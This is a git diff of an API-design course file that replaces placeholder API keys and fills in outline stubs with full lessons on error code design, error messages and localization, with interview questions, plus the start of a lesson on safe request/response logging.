@@ -10667,7 +10667,7 @@ Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
 
 // API Key
 GET /api/users/me
-Authorization: ApiKey sk_test_abc123
+Authorization: ApiKey your_test_key
 
 // Custom schemes
 GET /api/users/me
@@ -10675,7 +10675,7 @@ Authorization: Token abc123xyz</div>
 
                             <p><strong>Real Example - Stripe:</strong></p>
                             <div class="code-block">curl https://api.stripe.com/v1/charges \\
-  -u sk_test_abc123: \\
+  -u your_test_key: \\
   -H "Content-Type: application/x-www-form-urlencoded"
 
 // Basic auth with API key as username, empty password</div>
@@ -11008,7 +11008,7 @@ User-Agent: MyApp/1.0
 
                             <h3>Stripe API Request</h3>
                             <div class="code-block">POST /v1/charges
-Authorization: Bearer sk_test_abc123
+Authorization: Bearer your_test_key
 Content-Type: application/x-www-form-urlencoded
 Idempotency-Key: charge_abc123
 
@@ -14659,57 +14659,700 @@ validator.isEmail(email);  // Tested, safe regex</div>
                         title: 'Error Codes & Messages Best Practices',
                         duration: '40 min',
                         content: `
-                            <h2>OUTLINE: Error Codes & Messages</h2>
+                            <h2>Error Code Design</h2>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>Error Code Design</strong>
-                                    - Naming conventions (SCREAMING_SNAKE_CASE)
-                                    - Namespacing for large APIs (AUTH_*, PAYMENT_*, etc.)
-                                    - Standard vs custom codes
-                                    - Version stability (don't change codes)
-                                </li>
-                                <li><strong>Error Message Writing</strong>
-                                    - Clear, actionable messages
-                                    - Avoid technical jargon
-                                    - Include what went wrong and how to fix
-                                    - Localization considerations
-                                </li>
-                                <li><strong>Error Code Catalog</strong>
-                                    - Authentication errors (401, 403)
-                                    - Validation errors (400, 422)
-                                    - Resource errors (404, 409)
-                                    - Rate limiting (429)
-                                    - Server errors (500, 502, 503, 504)
-                                </li>
-                                <li><strong>Maintaining Error Documentation</strong>
-                                    - Error code registry
-                                    - Documentation per error
-                                    - Examples and solutions
-                                    - API reference integration
-                                </li>
-                            </ul>
+                            <p><strong>Error codes</strong> are machine-readable identifiers that allow clients to programmatically handle specific error scenarios. Unlike error messages (which are for humans), error codes are contracts that should remain stable across API versions.</p>
 
-                            <h3>Examples to Include:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>Stripe's detailed error types and codes</li>
-                                <li>AWS error code patterns</li>
-                                <li>Twilio's error documentation</li>
-                                <li>Good vs bad error messages comparison</li>
-                            </ul>
+                            <h3>Naming Conventions</h3>
 
-                            <h3>Interview Topics:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>Why error codes are contracts</li>
-                                <li>Internationalization of error messages</li>
-                                <li>When to introduce new error codes vs reuse existing</li>
-                                <li>Error code versioning strategies</li>
+                            <div class="code-block">Error code naming patterns
+
+✅ GOOD: SCREAMING_SNAKE_CASE
+INVALID_EMAIL
+PAYMENT_FAILED
+RESOURCE_NOT_FOUND
+INSUFFICIENT_PERMISSIONS
+
+❌ BAD: Inconsistent naming
+invalid-email          // kebab-case
+PaymentFailed         // PascalCase
+resourceNotFound      // camelCase
+CARD_DECLINED         // Mixed with above - inconsistent!
+
+Best practice: Pick one convention and stick to it
+Most common: SCREAMING_SNAKE_CASE (clear, scannable, traditional for constants)</div>
+
+                            <h3>Namespacing for Large APIs</h3>
+
+                            <div class="code-block">Group related errors with prefixes
+
+// Authentication errors
+AUTH_TOKEN_MISSING
+AUTH_TOKEN_EXPIRED
+AUTH_TOKEN_INVALID
+AUTH_INSUFFICIENT_PERMISSIONS
+
+// Payment errors
+PAYMENT_CARD_DECLINED
+PAYMENT_INSUFFICIENT_FUNDS
+PAYMENT_PROCESSING_ERROR
+
+// Validation errors
+VALIDATION_MISSING_FIELD
+VALIDATION_INVALID_FORMAT
+VALIDATION_OUT_OF_RANGE
+
+// Resource errors
+RESOURCE_NOT_FOUND
+RESOURCE_ALREADY_EXISTS
+RESOURCE_CONFLICT
+
+Why namespacing?
+✅ Easy to categorize and search
+✅ Clear error domain at a glance
+✅ Easier to maintain documentation
+✅ Clients can handle error categories (catch all PAYMENT_* errors)
+
+Example client code:
+if (error.code.startsWith('PAYMENT_')) {
+  // Show payment-specific error UI
+} else if (error.code.startsWith('AUTH_')) {
+  // Redirect to login
+}</div>
+
+                            <h3>Standard vs Custom Codes</h3>
+
+                            <div class="code-block">When to use standard HTTP codes vs custom error codes
+
+HTTP Status Code: Broad category (400, 404, 500)
+Custom Error Code: Specific reason (USER_NOT_FOUND, INVALID_EMAIL)
+
+Example:
+HTTP 400 Bad Request
+{
+  "error": {
+    "code": "INVALID_EMAIL",        ← Custom code (specific)
+    "message": "Email format is invalid"
+  }
+}
+
+HTTP 404 Not Found
+{
+  "error": {
+    "code": "USER_NOT_FOUND",       ← Custom code (what not found)
+    "message": "No user exists with ID 12345"
+  }
+}
+
+HTTP 403 Forbidden
+{
+  "error": {
+    "code": "INSUFFICIENT_PERMISSIONS",
+    "message": "Admin role required to delete users"
+  }
+}
+
+Don't duplicate HTTP status in error code:
+❌ BAD_REQUEST_INVALID_EMAIL       // Redundant "BAD_REQUEST"
+✅ INVALID_EMAIL                    // Status code already says 400
+
+HTTP status tells HOW to handle (retry? show error? redirect?)
+Error code tells WHY it failed (for specific handling logic)</div>
+
+                            <h3>Version Stability</h3>
+
+                            <div class="code-block">Error codes are contracts - don't change them!
+
+❌ BAD: Changing error codes
+Version 1.0: "USER_NOT_FOUND"
+Version 2.0: "USER_DOES_NOT_EXIST"  // Breaks clients!
+
+Client code breaks:
+if (error.code === 'USER_NOT_FOUND') {
+  showCreateUserDialog();  // Never triggered in v2.0!
+}
+
+✅ GOOD: Stable codes across versions
+Version 1.0: "USER_NOT_FOUND"
+Version 2.0: "USER_NOT_FOUND"  // Same code
+
+Messages can change:
+Version 1.0: "User not found"
+Version 2.0: "We couldn't find a user with that ID"  // ✅ OK to change
+
+Why?
+- Messages are human-readable (localization, clarity improvements)
+- Codes are machine-readable (client logic depends on them)
+
+If you MUST change a code:
+1. Support both old and new codes for 12 months
+2. Document deprecation clearly
+3. Log warnings when old code is checked
+4. Migrate clients gradually</div>
+
+                            <h2>Error Message Writing</h2>
+
+                            <h3>Clear, Actionable Messages</h3>
+
+                            <div class="code-block">❌ BAD: Vague, unhelpful messages
+
+"Invalid input"
+→ What input? Which field? What's wrong with it?
+
+"Error occurred"
+→ What error? What do I do?
+
+"Validation failed"
+→ Which validation? How to fix?
+
+"Request failed"
+→ Why? Can I retry?
+
+✅ GOOD: Clear, specific, actionable
+
+"Email format is invalid. Please provide a valid email address like user@example.com"
+→ Says what's wrong, how to fix, gives example
+
+"Payment failed: insufficient funds. Please add funds to your account or use a different payment method"
+→ Says what happened, why, and what to do
+
+"API key is invalid. Please check your key at https://dashboard.example.com/api-keys"
+→ Specific problem, points to solution
+
+"User with email 'bob@example.com' already exists. Please use a different email or log in to the existing account"
+→ Clear conflict, provides alternatives
+
+Pattern: [What went wrong] + [Why] + [How to fix]</div>
+
+                            <h3>Avoid Technical Jargon</h3>
+
+                            <div class="code-block">❌ BAD: Technical messages for end users
+
+"NullPointerException in UserService.findById()"
+→ Meaningless to users, exposes internals
+
+"Database constraint violation: UNIQUE KEY violation on users.email"
+→ Too technical
+
+"JWT signature verification failed: invalid algorithm"
+→ Security jargon
+
+"Serialization error: Cannot convert object to JSON"
+→ Implementation details
+
+✅ GOOD: User-friendly messages
+
+"An unexpected error occurred. Please try again or contact support"
+→ Simple, actionable
+
+"This email is already registered. Please use a different email"
+→ User understands the issue
+
+"Your session has expired. Please log in again"
+→ Clear what happened and what to do
+
+"Unable to process your request. Please try again later"
+→ Friendly, no technical details
+
+Keep technical details in:
+- Server logs (for debugging)
+- Internal error codes
+- Developer-facing API docs
+
+Show user-friendly messages to:
+- End users (mobile apps, web apps)
+- API consumers (unless they're developers)</div>
+
+                            <h3>Include Context</h3>
+
+                            <div class="code-block">❌ BAD: No context
+
+{
+  "error": "Value too large"
+}
+→ Which value? How large? What's the limit?
+
+✅ GOOD: Includes context
+
+{
+  "error": {
+    "code": "VALUE_TOO_LARGE",
+    "message": "File size exceeds maximum allowed size",
+    "details": {
+      "field": "profile_image",
+      "provided": "15 MB",
+      "maximum": "10 MB"
+    }
+  }
+}
+
+❌ BAD: Generic error
+{
+  "error": "Invalid date"
+}
+
+✅ GOOD: Specific with example
+{
+  "error": {
+    "code": "INVALID_DATE_FORMAT",
+    "message": "Date must be in ISO 8601 format (YYYY-MM-DD). Example: 2024-01-15",
+    "details": {
+      "field": "birth_date",
+      "provided": "01/15/2024",
+      "expected_format": "YYYY-MM-DD"
+    }
+  }
+}</div>
+
+                            <h3>Localization Considerations</h3>
+
+                            <div class="code-block">Internationalization (i18n) for error messages
+
+// Server returns code + message
+{
+  "error": {
+    "code": "INVALID_EMAIL",
+    "message": "Email format is invalid"  // Default: English
+  }
+}
+
+// Client handles localization
+const errorMessages = {
+  en: {
+    INVALID_EMAIL: "Email format is invalid"
+  },
+  es: {
+    INVALID_EMAIL: "El formato del correo electrónico no es válido"
+  },
+  fr: {
+    INVALID_EMAIL: "Le format de l'e-mail est invalide"
+  }
+};
+
+function getErrorMessage(code, locale = 'en') {
+  return errorMessages[locale][code] || errorMessages['en'][code];
+}
+
+// Display localized message
+const userLocale = navigator.language.split('-')[0]; // "en", "es", "fr"
+const localizedMessage = getErrorMessage(error.code, userLocale);
+
+Alternative: Server-side localization
+GET /api/users
+Headers:
+  Accept-Language: es
+
+Response:
+{
+  "error": {
+    "code": "INVALID_EMAIL",
+    "message": "El formato del correo electrónico no es válido"
+  }
+}
+
+Best practice:
+- Error code: Always in English, stable (INVALID_EMAIL)
+- Error message: Localized based on Accept-Language header
+- Client can override with own translations using error code</div>
+
+                            <h2>Error Code Catalog</h2>
+
+                            <h3>Authentication Errors (401, 403)</h3>
+
+                            <div class="code-block">Common auth error codes
+
+401 Unauthorized (authentication required)
+AUTH_TOKEN_MISSING        - No token provided
+AUTH_TOKEN_EXPIRED        - Token expired, refresh needed
+AUTH_TOKEN_INVALID        - Token malformed or signature invalid
+AUTH_CREDENTIALS_INVALID  - Wrong username/password
+AUTH_API_KEY_INVALID      - API key not recognized
+
+403 Forbidden (authenticated but not authorized)
+AUTH_INSUFFICIENT_PERMISSIONS  - Need higher role (admin, etc.)
+AUTH_RESOURCE_FORBIDDEN        - Can't access this specific resource
+AUTH_ACTION_FORBIDDEN          - Can't perform this action
+AUTH_ACCOUNT_SUSPENDED         - Account temporarily disabled
+AUTH_EMAIL_NOT_VERIFIED        - Must verify email first
+
+Example usage:
+if (error.code === 'AUTH_TOKEN_EXPIRED') {
+  // Refresh token and retry
+  await refreshAccessToken();
+  return retryRequest();
+} else if (error.code === 'AUTH_INSUFFICIENT_PERMISSIONS') {
+  // Show "Contact admin for access" message
+  showPermissionError();
+}</div>
+
+                            <h3>Validation Errors (400, 422)</h3>
+
+                            <div class="code-block">Common validation error codes
+
+400 Bad Request (generic client error)
+VALIDATION_MISSING_FIELD     - Required field not provided
+VALIDATION_INVALID_FORMAT    - Wrong format (email, URL, etc.)
+VALIDATION_INVALID_TYPE      - Wrong data type (string vs number)
+VALIDATION_OUT_OF_RANGE      - Number too large/small, string too long
+VALIDATION_INVALID_ENUM      - Value not in allowed list
+VALIDATION_INVALID_PATTERN   - Doesn't match regex (phone, zip code)
+
+422 Unprocessable Entity (business logic validation)
+VALIDATION_EMAIL_EXISTS      - Email already registered
+VALIDATION_USERNAME_TAKEN    - Username already in use
+VALIDATION_INVALID_COUPON    - Coupon expired or doesn't exist
+VALIDATION_INSUFFICIENT_STOCK - Product out of stock
+VALIDATION_AGE_REQUIREMENT   - Must be 18+ to register
+
+Pattern:
+400 = Input format/syntax errors
+422 = Business rule violations</div>
+
+                            <h3>Resource Errors (404, 409, 410)</h3>
+
+                            <div class="code-block">Common resource error codes
+
+404 Not Found
+RESOURCE_NOT_FOUND           - Generic resource doesn't exist
+USER_NOT_FOUND               - Specific: user doesn't exist
+ORDER_NOT_FOUND              - Specific: order doesn't exist
+ENDPOINT_NOT_FOUND           - API endpoint doesn't exist
+
+409 Conflict
+RESOURCE_ALREADY_EXISTS      - Creating duplicate resource
+RESOURCE_CONFLICT            - Conflicting update (version mismatch)
+OPERATION_CONFLICT           - Can't perform op in current state
+
+410 Gone
+RESOURCE_DELETED             - Resource was deleted
+RESOURCE_EXPIRED             - Resource expired (temp links)
+
+Example: Specific vs generic codes
+❌ Generic only:
+{ "code": "NOT_FOUND" }
+→ Client can't tell what wasn't found
+
+✅ Specific codes:
+{ "code": "USER_NOT_FOUND" }
+{ "code": "ORDER_NOT_FOUND" }
+→ Client can show specific error UI</div>
+
+                            <h3>Rate Limiting (429)</h3>
+
+                            <div class="code-block">Rate limiting error codes
+
+429 Too Many Requests
+RATE_LIMIT_EXCEEDED           - Generic rate limit hit
+RATE_LIMIT_PER_MINUTE         - Per-minute limit exceeded
+RATE_LIMIT_PER_HOUR           - Per-hour limit exceeded
+RATE_LIMIT_PER_DAY            - Daily quota exceeded
+RATE_LIMIT_CONCURRENT         - Too many concurrent requests
+
+Include retry info:
+{
+  "error": {
+    "code": "RATE_LIMIT_EXCEEDED",
+    "message": "Rate limit exceeded. Try again in 45 seconds",
+    "retry_after": 45
+  }
+}
+
+Headers:
+X-RateLimit-Limit: 1000
+X-RateLimit-Remaining: 0
+X-RateLimit-Reset: 1617123456
+Retry-After: 45</div>
+
+                            <h3>Server Errors (500, 502, 503, 504)</h3>
+
+                            <div class="code-block">Server error codes
+
+500 Internal Server Error
+INTERNAL_SERVER_ERROR        - Generic server error
+DATABASE_ERROR               - Database connection/query failed
+THIRD_PARTY_ERROR           - External service failed
+CONFIGURATION_ERROR         - Server misconfigured
+
+502 Bad Gateway
+UPSTREAM_SERVICE_ERROR       - Backend service returned error
+GATEWAY_ERROR               - API gateway issue
+
+503 Service Unavailable
+SERVICE_MAINTENANCE          - Scheduled maintenance
+SERVICE_OVERLOADED          - Too much traffic, temporary
+DATABASE_UNAVAILABLE        - Database down
+
+504 Gateway Timeout
+UPSTREAM_TIMEOUT            - Backend service timeout
+REQUEST_TIMEOUT             - Request took too long
+
+Best practice for 5xx:
+- Log detailed error server-side
+- Return generic message to client (don't expose internals)
+- Include request ID for support</div>
+
+                            <h2>Maintaining Error Documentation</h2>
+
+                            <h3>Error Code Registry</h3>
+
+                            <div class="code-block">Central error code registry
+
+// errors.js - Single source of truth
+const ErrorCodes = {
+  // Authentication
+  AUTH_TOKEN_MISSING: {
+    code: 'AUTH_TOKEN_MISSING',
+    httpStatus: 401,
+    message: 'Authentication token is required',
+    category: 'authentication'
+  },
+  AUTH_TOKEN_EXPIRED: {
+    code: 'AUTH_TOKEN_EXPIRED',
+    httpStatus: 401,
+    message: 'Authentication token has expired',
+    category: 'authentication',
+    retry: true,
+    action: 'refresh_token'
+  },
+
+  // Validation
+  INVALID_EMAIL: {
+    code: 'INVALID_EMAIL',
+    httpStatus: 400,
+    message: 'Email format is invalid',
+    category: 'validation',
+    example: 'user@example.com'
+  },
+
+  // Payment
+  PAYMENT_CARD_DECLINED: {
+    code: 'PAYMENT_CARD_DECLINED',
+    httpStatus: 402,
+    message: 'Payment card was declined',
+    category: 'payment',
+    retry: true
+  }
+};
+
+// Generate OpenAPI error documentation
+function generateErrorDocs() {
+  return Object.values(ErrorCodes).map(error => ({
+    code: error.code,
+    status: error.httpStatus,
+    description: error.message,
+    category: error.category
+  }));
+}
+
+// Validate error codes in code
+function createError(code, details) {
+  if (!ErrorCodes[code]) {
+    throw new Error(`Unknown error code: ${code}`);
+  }
+  return {
+    ...ErrorCodes[code],
+    details
+  };
+}</div>
+
+                            <h3>Documentation Per Error</h3>
+
+                            <div class="code-block">Stripe's error documentation pattern
+
+Error Code: card_declined
+HTTP Status: 402 Payment Required
+Category: Card Errors
+
+Description:
+The card has been declined. When a card is declined, the error
+returned also includes the decline_code attribute with the reason
+why the card was declined.
+
+Common Causes:
+- Insufficient funds
+- Card reported lost or stolen
+- Card expired
+- Incorrect CVC code
+
+How to Handle:
+1. Display the error to the customer
+2. Ask them to contact their bank or try a different card
+3. Don't retry the same card (will be declined again)
+
+Example Response:
+{
+  "error": {
+    "type": "card_error",
+    "code": "card_declined",
+    "decline_code": "insufficient_funds",
+    "message": "Your card has insufficient funds."
+  }
+}
+
+Related Error Codes:
+- card_expired
+- incorrect_cvc
+- processing_error
+
+Support Article: https://stripe.com/docs/declines</div>
+
+                            <h2>Real-World Examples</h2>
+
+                            <h3>Stripe Error Codes</h3>
+
+                            <div class="code-block">Stripe uses type + code system
+
+{
+  "error": {
+    "type": "card_error",              // Error category
+    "code": "card_declined",           // Specific code
+    "decline_code": "insufficient_funds", // Even more specific
+    "message": "Your card has insufficient funds.",
+    "param": "card",                   // Which parameter
+    "charge": "ch_abc123"              // Related resource
+  }
+}
+
+Error types:
+- api_error: Stripe's servers failed
+- card_error: Card was declined
+- validation_error: Invalid parameters
+- authentication_error: Invalid API key
+- rate_limit_error: Too many requests
+- idempotency_error: Idempotency key issue
+
+Each type has specific codes:
+card_error codes: card_declined, expired_card, incorrect_cvc
+validation_error codes: missing_param, invalid_param</div>
+
+                            <h3>AWS Error Patterns</h3>
+
+                            <div class="code-block">AWS uses namespaced error codes
+
+// S3 errors
+NoSuchBucket
+NoSuchKey
+BucketAlreadyExists
+AccessDenied
+
+// DynamoDB errors
+ConditionalCheckFailedException
+ProvisionedThroughputExceededException
+ResourceNotFoundException
+ValidationException
+
+// IAM errors
+InvalidClientTokenId
+SignatureDoesNotMatch
+AccessDenied
+
+Pattern: PascalCase, descriptive names
+Documentation includes:
+- HTTP status code
+- Error code
+- Description
+- Possible causes
+- Example response XML/JSON</div>
+
+                            <h3>Good vs Bad Error Messages</h3>
+
+                            <div class="code-block">Comparison table
+
+┌────────────────────────────────────────┬──────────────────────────────────────────┐
+│ ❌ BAD                                 │ ✅ GOOD                                  │
+├────────────────────────────────────────┼──────────────────────────────────────────┤
+│ "Error"                                │ "Email format is invalid. Please use     │
+│                                        │ format: user@example.com"                │
+├────────────────────────────────────────┼──────────────────────────────────────────┤
+│ "Invalid request"                      │ "Password must be at least 8 characters  │
+│                                        │ and include one number"                  │
+├────────────────────────────────────────┼──────────────────────────────────────────┤
+│ "Something went wrong"                 │ "Unable to process payment. Please check │
+│                                        │ your card details or try another card"   │
+├────────────────────────────────────────┼──────────────────────────────────────────┤
+│ "Forbidden"                            │ "You don't have permission to delete     │
+│                                        │ users. Contact your admin for access"    │
+├────────────────────────────────────────┼──────────────────────────────────────────┤
+│ "Not found"                            │ "User with ID '12345' not found"         │
+├────────────────────────────────────────┼──────────────────────────────────────────┤
+│ "Server error"                         │ "We're experiencing technical difficulties│
+│                                        │ Please try again in a few minutes"       │
+└────────────────────────────────────────┴──────────────────────────────────────────┘</div>
+
+                            <h2>Common Mistakes</h2>
+
+                            <div class="code-block">1. Changing error codes
+❌ Renaming codes breaks client logic
+✅ Keep codes stable, only change messages
+
+2. Generic error codes
+❌ Single "ERROR" code for everything
+✅ Specific codes (INVALID_EMAIL, USER_NOT_FOUND)
+
+3. No namespacing
+❌ All codes at same level, hard to organize
+✅ Use prefixes (AUTH_*, PAYMENT_*, VALIDATION_*)
+
+4. Technical jargon in messages
+❌ "NullPointerException in line 42"
+✅ "An error occurred. Please try again"
+
+5. Missing context
+❌ "Value too large"
+✅ "File size (15 MB) exceeds limit (10 MB)"
+
+6. Not documenting error codes
+❌ Codes in code, no central reference
+✅ Maintain error code registry with docs
+
+7. Inconsistent naming
+❌ Mixed camelCase, snake_case, PascalCase
+✅ Pick one convention and stick to it
+
+8. Exposing internal details
+❌ Showing stack traces, DB queries to users
+✅ Log internally, show friendly messages externally</div>
+
+                            <h2>Summary</h2>
+
+                            <ul>
+                                <li><strong>Error codes</strong> are machine-readable contracts that should remain stable across versions (unlike messages)</li>
+                                <li><strong>Naming:</strong> Use SCREAMING_SNAKE_CASE consistently, namespace with prefixes (AUTH_*, PAYMENT_*)</li>
+                                <li><strong>HTTP status:</strong> Broad category (400, 404), custom code is specific reason (INVALID_EMAIL, USER_NOT_FOUND)</li>
+                                <li><strong>Messages:</strong> Clear, actionable, include context (what went wrong + why + how to fix)</li>
+                                <li><strong>Avoid jargon:</strong> Keep technical details in logs, show user-friendly messages to clients</li>
+                                <li><strong>Localization:</strong> Error code in English (stable), message localized via Accept-Language or client-side</li>
+                                <li><strong>Error catalog:</strong> Document each code with HTTP status, description, common causes, how to handle</li>
+                                <li><strong>Registry:</strong> Maintain central error code registry as single source of truth</li>
+                                <li><strong>Documentation:</strong> Include error codes in API reference, provide examples and solutions</li>
+                                <li><strong>Real examples:</strong> Stripe (type + code + decline_code), AWS (namespaced PascalCase codes)</li>
+                                <li><strong>Best practice:</strong> Specific error codes, stable across versions, well-documented, user-friendly messages</li>
                             </ul>
                         `,
                         interviews: [
                             {
                                 question: "Why are error codes considered contracts and what happens if you change them?",
-                                answer: "OUTLINE: Error codes are machine-readable identifiers that client code depends on. Changing USER_NOT_FOUND to USER_DOES_NOT_EXIST breaks existing clients. Codes should be stable across API versions. Messages can change (human-readable), codes cannot (machine-readable contracts)."
+                                answer: "Error codes are machine-readable identifiers that client code depends on for programmatic error handling. Example: if (error.code === 'USER_NOT_FOUND') { showCreateUserDialog(); }. If you change USER_NOT_FOUND to USER_DOES_NOT_EXIST in a new version, this client code breaks - the condition never matches, dialog never shows. Codes are contracts because: 1) Clients write logic against specific codes, 2) Changing codes breaks existing integrations, 3) Unlike error messages (for humans), codes are parsed by machines. Messages can change freely (localization, clarity improvements), codes cannot. If you must change: 1) Support both old and new codes for 12+ months, 2) Document deprecation clearly, 3) Log warnings when old codes checked, 4) Give clients time to migrate. Better: choose good codes initially and keep them forever. HTTP status can change (400→422), but custom error code (INVALID_EMAIL) should stay stable."
+                            },
+                            {
+                                question: "How do you design a good error message that is both helpful and secure?",
+                                answer: "Good error message pattern: [What went wrong] + [Why] + [How to fix]. Example: 'Payment failed: insufficient funds. Please add funds or use different card'. Helpful: 1) Be specific (not just 'Error occurred'), 2) Include context (which field, what value, what limit), 3) Provide examples ('Email must be like user@example.com'), 4) Suggest solutions (actionable steps), 5) Avoid jargon (not 'NullPointerException', say 'An error occurred'). Secure: 1) Don't expose internals (stack traces, file paths, SQL queries), 2) Don't leak sensitive data (partial credit card OK, full number NO), 3) Don't reveal too much (404 for both user-not-found and insufficient-permissions to prevent enumeration), 4) Log details server-side, show generic message to client. Two-tier approach: Technical errors (DB failures, null pointers) → log internally + show 'Something went wrong, please try again', User errors (invalid email, weak password) → show specific helpful message. Include request ID for support correlation without exposing technical details."
+                            },
+                            {
+                                question: "What is error code namespacing and when should you use it?",
+                                answer: "Error code namespacing uses prefixes to group related errors: AUTH_TOKEN_EXPIRED, AUTH_INSUFFICIENT_PERMISSIONS, PAYMENT_CARD_DECLINED, PAYMENT_INSUFFICIENT_FUNDS, VALIDATION_INVALID_EMAIL. Benefits: 1) Easy categorization (all AUTH_* errors in one place), 2) Clear domain at a glance (PAYMENT_* = payment issue), 3) Enables category handling in clients: if (error.code.startsWith('AUTH_')) { redirectToLogin(); }, 4) Easier documentation (group by namespace), 5) Scalable (add new codes without conflicts). When to use: 1) Large APIs (50+ error codes), 2) Multiple error domains (auth, payment, validation, resources), 3) Different teams own different areas. When NOT needed: Small APIs (10-20 total codes), single domain. Alternative: Stripe uses 'type' field instead of prefixes: { type: 'card_error', code: 'card_declined' }. Both approaches work, pick one and be consistent. Common namespaces: AUTH (authentication/authorization), VALIDATION (input validation), PAYMENT (payment processing), RESOURCE (not found, conflict), RATE_LIMIT, SERVER (internal errors)."
+                            },
+                            {
+                                question: "How do you handle error message internationalization (i18n)?",
+                                answer: "Two approaches for error message i18n: 1) Server-side: Client sends Accept-Language header, server returns localized message: GET /api/users, Accept-Language: es → { code: 'INVALID_EMAIL', message: 'El formato del correo no es válido' }. 2) Client-side: Server returns code only, client maps to localized message: const messages = { en: { INVALID_EMAIL: 'Email format invalid' }, es: { INVALID_EMAIL: 'Formato de correo inválido' } }; display messages[locale][error.code]. Recommendation: Client-side because: 1) Server doesn't need translation files (simpler), 2) Client controls exact wording for their UX, 3) Can update translations without server deploy, 4) Works offline (translations in app bundle). Error code stays English and stable (INVALID_EMAIL never changes), only messages are localized. Always include error code in response so clients can map to their translations. For APIs: Server-side i18n if you control all clients, client-side if third-party integrations. Structure: { error: { code: 'INVALID_EMAIL', message: 'Email format invalid', message_key: 'errors.invalid_email' } } - message_key helps with client translation lookups."
+                            },
+                            {
+                                question: "When should you introduce a new error code vs reuse an existing one?",
+                                answer: "Introduce new error code when: 1) Different handling needed: PAYMENT_CARD_DECLINED (retry with different card) vs PAYMENT_PROCESSING_ERROR (retry same card) require different client logic, 2) Different HTTP status: VALIDATION_INVALID_FORMAT (400) vs VALIDATION_EMAIL_EXISTS (422) have different statuses, 3) Important distinction: USER_NOT_FOUND vs ORDER_NOT_FOUND helps client show specific message, 4) Tracking/metrics: Want to measure specific error rate separately. Reuse existing code when: 1) Same handling: Multiple fields with invalid format can all use VALIDATION_INVALID_FORMAT (specify field in details), 2) Same HTTP status and category: Don't need PASSWORD_TOO_SHORT, PASSWORD_TOO_LONG - use VALIDATION_OUT_OF_RANGE with context, 3) Generic is enough: Don't need USER_NOT_FOUND, PRODUCT_NOT_FOUND, ORDER_NOT_FOUND - use RESOURCE_NOT_FOUND with resource_type field. Balance: Too few codes = clients can't handle specifically, too many codes = hard to maintain. Rule of thumb: If client would handle it differently (different UI, different retry logic), use separate code. Otherwise, reuse with context in details field. Example: Stripe has ~50 error codes across entire API - not hundreds."
+                            },
+                            {
+                                question: "How should you maintain an error code registry and documentation?",
+                                answer: "Error code registry = single source of truth for all error codes. Implementation: 1) Create errors.js file with all codes: const ErrorCodes = { INVALID_EMAIL: { code: 'INVALID_EMAIL', httpStatus: 400, message: 'Email format invalid', category: 'validation' } }. 2) Use registry in code: function createError(code, details) { return { ...ErrorCodes[code], details }; } - prevents typos, ensures consistency. 3) Generate documentation from registry: Auto-generate OpenAPI error responses, markdown docs, client SDKs from same source. 4) Validate at build time: Check all thrown errors use registered codes, no hardcoded strings. Documentation per error: 1) HTTP status, 2) Error code, 3) Description (what it means), 4) Common causes (why it happens), 5) How to handle (client actions), 6) Example response, 7) Related codes, 8) Support article link. Maintenance: 1) Never remove codes (deprecate instead), 2) Add new codes to bottom (don't reorder), 3) Version registry with API versions, 4) Review codes quarterly (consolidate duplicates). Integration: Include error codes in OpenAPI spec, link from API docs, provide searchable error code reference page. Example: Stripe's docs have dedicated page per error code with everything above."
                             }
                         ]
                     },
@@ -14718,63 +15361,669 @@ validator.isEmail(email);  // Tested, safe regex</div>
                         title: 'API Debugging & Troubleshooting',
                         duration: '40 min',
                         content: `
-                            <h2>OUTLINE: Debugging & Troubleshooting</h2>
+                            <h2>Request/Response Logging</h2>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>Request/Response Logging</strong>
-                                    - What to log (headers, body, timing)
-                                    - What NOT to log (passwords, tokens, PII)
-                                    - Structured logging (JSON format)
-                                    - Log levels (DEBUG, INFO, WARN, ERROR)
-                                    - Request ID correlation
-                                </li>
-                                <li><strong>Debugging Headers</strong>
-                                    - X-Request-ID for tracking
-                                    - X-Response-Time for performance
-                                    - X-Debug-Info in development
-                                    - Server-Timing API
-                                </li>
-                                <li><strong>Error Context</strong>
-                                    - Stack traces (log server-side, never expose)
-                                    - Request context (user, endpoint, method)
-                                    - Environment info (version, region)
-                                    - Upstream service errors
-                                </li>
-                                <li><strong>Tools & Techniques</strong>
-                                    - Postman/Insomnia for testing
-                                    - curl commands for debugging
-                                    - Browser DevTools for APIs
-                                    - Proxy tools (Charles, Fiddler)
-                                    - API testing tools (HTTPie, REST Client)
-                                </li>
-                                <li><strong>Distributed Tracing</strong>
-                                    - Trace IDs across microservices
-                                    - OpenTelemetry/Jaeger
-                                    - Correlation across services
-                                    - Performance bottleneck identification
-                                </li>
-                            </ul>
+                            <p>Effective logging is essential for debugging API issues. You need enough information to diagnose problems without compromising security or performance.</p>
 
-                            <h3>Examples to Include:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>Request ID flow through system</li>
-                                <li>Structured log format examples</li>
-                                <li>Debug mode implementation</li>
-                                <li>Common debugging scenarios</li>
-                            </ul>
+                            <h3>What to Log</h3>
 
-                            <h3>Interview Topics:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>What should never be logged and why</li>
-                                <li>Request ID propagation in microservices</li>
-                                <li>Debugging production issues without exposing details to clients</li>
+                            <div class="code-block">✅ Safe to log:
+
+Request:
+- HTTP method (GET, POST, PUT, DELETE)
+- URL path (/api/users/123)
+- Query parameters (non-sensitive: ?page=1&limit=10)
+- Request headers (Content-Type, Accept, User-Agent)
+- Request ID (correlation tracking)
+- Timestamp
+- IP address (anonymized for GDPR)
+- User ID (if authenticated)
+
+Response:
+- HTTP status code (200, 404, 500)
+- Response time (ms)
+- Response size (bytes)
+- Error codes (INVALID_EMAIL, USER_NOT_FOUND)
+- Request ID (same as request)
+
+Performance:
+- Database query time
+- External API call time
+- Cache hit/miss
+- Total request duration</div>
+
+                            <h3>What NOT to Log</h3>
+
+                            <div class="code-block">❌ NEVER log:
+
+Authentication/Authorization:
+- Passwords (plain or hashed)
+- API keys, tokens, secrets
+- OAuth tokens, refresh tokens
+- Session IDs, cookies
+- Authorization headers (contains tokens)
+
+Financial/Personal Data:
+- Full credit card numbers (PCI-DSS violation)
+- CVV codes, PINs
+- Social Security Numbers
